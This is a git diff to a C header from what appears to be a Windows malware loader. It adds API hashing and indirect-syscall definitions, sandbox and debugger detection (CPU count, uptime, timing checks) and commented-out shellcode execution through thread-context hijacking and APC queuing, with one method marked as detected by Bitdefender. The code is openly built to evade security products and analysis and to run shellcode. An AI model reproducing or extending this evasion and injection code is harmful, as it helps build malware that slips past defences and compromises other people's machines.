@@ -1,8 +1,8 @@
 #pragma once
 #include <windows.h>
 #include "structs.h"
-
-
+#include <stdio.h>
+#include <stdlib.h>
 
 
 #define CONTAINING_RECORD(address, type, field) \
@@ -48,6 +48,9 @@ typedef NTSTATUS(__stdcall* fnRtlCreateProcessParametersEx)(
 );
 
 
+typedef NTSTATUS(NTAPI* pNtSetContextThread)(HANDLE, PCONTEXT);
+typedef NTSTATUS(NTAPI* pNtGetContextThread)(HANDLE, PCONTEXT);
+
 
 
 typedef struct SYSCALL {
@@ -88,6 +91,8 @@ typedef struct SYS_FUNC {
     SYSCALL NtSetInformationThread;
     SYSCALL NtCreateFile;
     SYSCALL NtReadFile;
+    SYSCALL NtSetContextThread;
+    SYSCALL NtGetContextThread;
 }SYS_FUNC, *PSYS_FUNC;
 
 SYS_FUNC sys_func = {0};
@@ -109,6 +114,11 @@ SYS_FUNC sys_func = {0};
 #define RtlInitUnicodeStringHash    0xBF72BF9D
 #define NtQuerySystemInformationHash        0x92AAE17C
 
+
+
+#define NTSETCONTEXTTHREADhash 	0xB48F4EC4 
+#define NTGETCONTEXTTHREADhash 	0xC8840EB8 
+
 #define NtOpenProcessHash   0x8151CCCC
 #define CreateToolhelp32SnapshotHash    0xEC46A0E9
 #define Process32FirstHash      0x020D0CE5
@@ -128,3 +138,87 @@ SYS_FUNC sys_func = {0};
  
 #define SET_SYSCALL(SYSCALL)(RedroGates((DWORD)SYSCALL.dwSSN,(PVOID)SYSCALL.pSyscallAddress))
 
+// 
+//                                         Anti-Analysis
+// 
+// -------------------------------- //// -------------------------------- //// -------------------------------- //
+
+void myprintf(const char* pszFormat, ...) {
+    char buf[1024];
+    va_list argList;
+    va_start(argList, pszFormat);
+    wvsprintfA(buf, pszFormat, argList);
+    va_end(argList);
+    DWORD done;
+    WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), buf, strlen(buf), &done, NULL);
+}
+
+// -------------------------------- //// -------------------------------- //// -------------------------------- //
+int checkLowCPU() {
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+
+    if (sysInfo.dwNumberOfProcessors < 2) {
+        myprintf("Detected sandbox: Only %d CPU cores available\n", sysInfo.dwNumberOfProcessors);
+        return 1;
+    }
+    return 0;
+}
+
+// -------------------------------- //// -------------------------------- //// -------------------------------- //
+int isSandboxed() {
+    ULONGLONG uptime = GetTickCount64();
+    if (uptime < 90000) { // Less than 1 minute
+        //myprintf("Detected sandbox: System uptime too low (%llu ms)\n", uptime);
+        return 1;
+    }
+    return 0;
+}
+
+// -------------------------------- //// -------------------------------- //// -------------------------------- //
+
+BOOL CheckDebugTiming() {
+    DWORD t1, t2;
+    t1 = GetTickCount();
+    OutputDebugStringA("TEST");
+    t2 = GetTickCount();
+    return (t2 - t1 > 5); // If debugger is present, delay is longer
+}
+
+// -------------------------------- //// -------------------------------- //// -------------------------------- //
+
+//int IsDebugged() {
+//    
+//
+//}
+
+
+/*
+*************   Hijacking current thread  ***************
+    
+    HANDLE hThread = GetCurrentThread();
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_ALL;
+
+    if (NtGetContextThread(hThread, &ctx) != 0) return -1;
+
+    ctx.Rip = (DWORD64)Shellcode;  // Set RIP (EIP) to shellcode address
+
+    if (NtSetContextThread(hThread, &ctx) != 0) return -1;
+
+*/
+
+/*
+ *************  APC Execution in Main Thread ****************
+ 
+// Queue shellcode execution in current thread
+// detected by bitdefender 
+
+    NTSTATUS status = NtQueueApcThread(GetCurrentThread(), (PVOID)Shellcode, NULL, NULL, NULL);
+    if (status != 0) return -1;
+
+    // Force execution of queued APC
+    NtTestAlert();
+
+
+*/
